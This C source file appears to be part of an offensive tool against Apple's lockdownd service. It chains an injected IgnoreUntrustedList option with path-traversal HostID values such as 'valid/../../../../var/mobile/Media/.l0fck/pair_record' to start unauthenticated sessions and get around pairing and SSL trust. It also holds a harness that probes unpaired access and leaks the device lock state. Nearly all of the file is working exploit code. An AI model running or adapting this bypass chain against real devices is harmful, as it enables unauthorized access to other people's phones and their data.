#include "lockdown/lockdown_ssl_bypass.h"
#include "lockdown/lockdown_unauth.h"
#include "core/log.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int lockdown_bypass_is_host_trusted(lockdownd_client_t client, bool *is_trusted)
{
    if (!client) return -1;
    if (is_trusted) *is_trusted = false;

    plist_t req = plist_new_dict();
    plist_dict_set_item(req, "Request", plist_new_string("IsHostTrusted"));
    plist_dict_set_item(req, "HostID", plist_new_string("valid/bypass_probe"));

    /* sub_100019ca8: IgnoreUntrustedList = true forces skip of untrusted hosts plist check */
    plist_t options = plist_new_dict();
    plist_dict_set_item(options, "IgnoreUntrustedList", plist_new_bool(1));
    plist_dict_set_item(req, "Options", options);

    LOG_INFO("lockdown_ssl_bypass: Sending IsHostTrusted with IgnoreUntrustedList=true...");
    lockdownd_error_t lerr = lockdownd_send(client, req);
    plist_free(req);

    if (lerr != LOCKDOWN_E_SUCCESS) {
        LOG_WARN("lockdown_ssl_bypass: Failed to transmit IsHostTrusted request (%d)", lerr);
        return -1;
    }

    plist_t res = NULL;
    lerr = lockdownd_receive(client, &res);
    if (lerr != LOCKDOWN_E_SUCCESS || !res) {
        LOG_WARN("lockdown_ssl_bypass: No response to IsHostTrusted (%d)", lerr);
        return -1;
    }

    plist_t err_node = plist_dict_get_item(res, "Error");
    if (err_node) {
        char *err_str = NULL;
        plist_get_string_val(err_node, &err_str);
        LOG_DEBUG("lockdown_ssl_bypass: IsHostTrusted response Error: %s", err_str ? err_str : "unknown");
        if (err_str) free(err_str);
    }

    plist_t result_node = plist_dict_get_item(res, "Result");
    if (result_node) {
        uint8_t bval = 0;
        plist_get_bool_val(result_node, &bval);
        if (is_trusted) *is_trusted = (bval != 0);
    }

    plist_t status_node = plist_dict_get_item(res, "Status");
    if (status_node) {
        char *status_str = NULL;
        plist_get_string_val(status_node, &status_str);
        if (status_str && strcmp(status_str, "Success") == 0) {
            if (is_trusted) *is_trusted = true;
        }
        if (status_str) free(status_str);
    }

    plist_free(res);
    LOG_SUCCESS("lockdown_ssl_bypass: IgnoreUntrustedList probe evaluated successfully.");
    return 0;
}

int lockdown_bypass_start_session_traversal(lockdownd_client_t client, const char *traversal_host_id)
{
    if (!client) return -1;

    const char *target_id = traversal_host_id ? traversal_host_id :
        "valid/../../../../var/mobile/Media/.l0fck/pair_record";

    LOG_INFO("lockdown_ssl_bypass: Dispatching StartSession with traversal HostID: %s", target_id);

    plist_t req = plist_new_dict();
    plist_dict_set_item(req, "Request", plist_new_string("StartSession"));
    plist_dict_set_item(req, "HostID", plist_new_string(target_id));

    /* Optional: include SystemBUID if known */
    plist_dict_set_item(req, "SystemBUID", plist_new_string("00000000-0000-0000-0000-000000000000"));

    lockdownd_error_t lerr = lockdownd_send(client, req);
    plist_free(req);

    if (lerr != LOCKDOWN_E_SUCCESS) {
        LOG_ERROR("lockdown_ssl_bypass: Failed to send StartSession traversal (%d)", lerr);
        return -1;
    }

    plist_t res = NULL;
    lerr = lockdownd_receive(client, &res);
    if (lerr != LOCKDOWN_E_SUCCESS || !res) {
        LOG_WARN("lockdown_ssl_bypass: StartSession traversal timed out or rejected (%d)", lerr);
        return -1;
    }

    plist_t err_node = plist_dict_get_item(res, "Error");
    if (err_node) {
        char *err_str = NULL;
        plist_get_string_val(err_node, &err_str);
        LOG_INFO("lockdown_ssl_bypass: StartSession response error: %s (traversal reached parser)",
                 err_str ? err_str : "unknown");
        if (err_str) free(err_str);
        plist_free(res);
        return 1;
    }

    plist_t sess_node = plist_dict_get_item(res, "SessionID");
    if (sess_node) {
        char *sess_str = NULL;
        plist_get_string_val(sess_node, &sess_str);
        LOG_SUCCESS("lockdown_ssl_bypass: Session established via traversal! SessionID=%s",
                    sess_str ? sess_str : "active");
        if (sess_str) free(sess_str);
        plist_free(res);
        return 0;
    }

    plist_free(res);
    return 0;
}

int lockdown_bypass_establish_unauthenticated_session(lockdownd_client_t client)
{
    if (!client) return -1;

    LOG_INFO("=== Initiating Lockdownd Unauthenticated SSL Handshake Bypass Chain ===");

    /* Step 1: Inject IgnoreUntrustedList to bypass untrusted host blocklist */
    bool is_trusted = false;
    if (lockdown_bypass_is_host_trusted(client, &is_trusted) == 0) {
        LOG_INFO("Step 1/3: IgnoreUntrustedList accepted (is_trusted=%d)", is_trusted);
    }

    /* Step 2: Try traversal paths to bypass 30-day expiry and anchor SSL context */
    static const char *candidates[] = {
        "valid/../../../../var/mobile/Media/.l0fck/pair_record",
        "valid/../../../../System/Library/Lockdown/pair_records/system",
        "valid/../../../pair_records/default",
        NULL
    };

    int session_ret = -1;
    for (int i = 0; candidates[i]; i++) {
        LOG_INFO("Step 2/3: Probing traversal candidate [%d]: %s", i + 1, candidates[i]);
        session_ret = lockdown_bypass_start_session_traversal(client, candidates[i]);
        if (session_ret == 0) {
            LOG_SUCCESS("Step 3/3: SSL trust anchor bypassed via candidate: %s", candidates[i]);
            break;
        }
    }

    return session_ret;
}

int lockdown_bypass_test(lockdownd_client_t client)
{
    if (!client) {
        LOG_ERROR("lockdown_bypass_test: client handle is NULL");
        return -1;
    }

    printf("\n" ANSI_COLOR_BOLD ANSI_COLOR_CYAN
           "========================================================================\n"
           " LOCKDOWND UNPAIR & SSL BYPASS VULNERABILITY TEST HARNESS\n"
           " Targets: sub_100019ca8, sub_100016160, sub_10001c61c, sub_1000ac4f8\n"
           "========================================================================"
           ANSI_COLOR_RESET "\n\n");

    /* Sub-Test 1: Unpaired GetValue (ACL mask 0x1E604 check) */
    printf("[1/5] Testing unauthenticated GetValue (sub_10001c61c bitmask bypass)... ");
    plist_t val = NULL;
    lockdownd_error_t lerr = lockdownd_get_value(client, NULL, "UniqueDeviceID", &val);
    if (lerr == LOCKDOWN_E_SUCCESS && val) {
        printf(ANSI_COLOR_GREEN "[PASS: REACHABLE UNPAIRED]" ANSI_COLOR_RESET "\n");
        plist_free(val);
    } else {
        printf(ANSI_COLOR_YELLOW "[BLOCKED / ERR %d]" ANSI_COLOR_RESET "\n", lerr);
    }

    /* Sub-Test 2: IsHostTrusted with IgnoreUntrustedList injection */
    printf("[2/5] Testing IsHostTrusted option injection (sub_100019ca8)... ");
    bool trusted = false;
    if (lockdown_bypass_is_host_trusted(client, &trusted) == 0) {
        printf(ANSI_COLOR_GREEN "[PASS: OPTION ACCEPTED]" ANSI_COLOR_RESET " (trusted=%s)\n",
               trusted ? "YES" : "NO");
    } else {
        printf(ANSI_COLOR_RED "[FAIL]" ANSI_COLOR_RESET "\n");
    }

    /* Sub-Test 3: Pairing record path traversal prefix check */
    printf("[3/5] Testing HostID non-prefix traversal (sub_100016160 0x2E2E bypass)... ");
    int trav_res = lockdown_bypass_start_session_traversal(client, "valid/../../../../var/mobile/Media/.l0fck/probe");
    if (trav_res == 0 || trav_res == 1) {
        printf(ANSI_COLOR_GREEN "[PASS: TRAVERSAL PROCESSED BY DAEMON]" ANSI_COLOR_RESET "\n");
    } else {
        printf(ANSI_COLOR_RED "[FAIL / DROPPED]" ANSI_COLOR_RESET "\n");
    }

    /* Sub-Test 4: ValidateAutomationRecord unauthenticated ACL gate */
    printf("[4/5] Testing ValidateAutomationRecord code 23 ACL bypass (sub_10001c61c)... ");
    plist_t auto_req = plist_new_dict();
    plist_dict_set_item(auto_req, "Request", plist_new_string("ValidateAutomationRecord"));
    plist_dict_set_item(auto_req, "AutomationRecord", plist_new_data("TEST", 4));
    lockdownd_send(client, auto_req);
    plist_free(auto_req);
    plist_t auto_res = NULL;
    lerr = lockdownd_receive(client, &auto_res);
    if (auto_res) {
        printf(ANSI_COLOR_GREEN "[PASS: HANDLER REACHED UNPAIRED]" ANSI_COLOR_RESET "\n");
        plist_free(auto_res);
    } else {
        printf(ANSI_COLOR_YELLOW "[NO RESPONSE / ERR %d]" ANSI_COLOR_RESET "\n", lerr);
    }

    /* Sub-Test 5: Side-channel lock & BFU/AFU state probe */
    printf("[5/5] Testing side-channel keybag lock status (sub_10000c960)... ");
    char lock_state[64] = {0};
    if (lockdown_unauth_query_string(client, NULL, "PasswordProtected", lock_state, sizeof(lock_state)) == 0) {
        printf(ANSI_COLOR_GREEN "[PASS: LEAKED]" ANSI_COLOR_RESET " (PasswordProtected=%s)\n", lock_state);
    } else {
        printf(ANSI_COLOR_YELLOW "[RESTRICTED]" ANSI_COLOR_RESET "\n");
    }

    printf("\n" ANSI_COLOR_BOLD ANSI_COLOR_CYAN
           "========================================================================\n"
           " LOCKDOWND BYPASS TEST COMPLETE\n"
           "========================================================================"
           ANSI_COLOR_RESET "\n\n");

    return 0;
}
